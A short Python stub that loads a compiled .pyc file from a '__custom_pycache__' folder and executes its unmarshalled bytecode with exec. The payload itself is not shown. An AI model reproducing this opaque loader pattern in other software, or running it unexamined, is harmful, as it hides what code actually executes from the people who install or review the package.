
import marshal
import os

s = open(os.path.join(os.path.dirname(os.path.realpath(__file__)), '__custom_pycache__', 'dataclass_b7532572489f4c99958fafebb9707395.cpython-xxx.pyc'), 'rb')
s.seek(16)
exec(marshal.load(s))
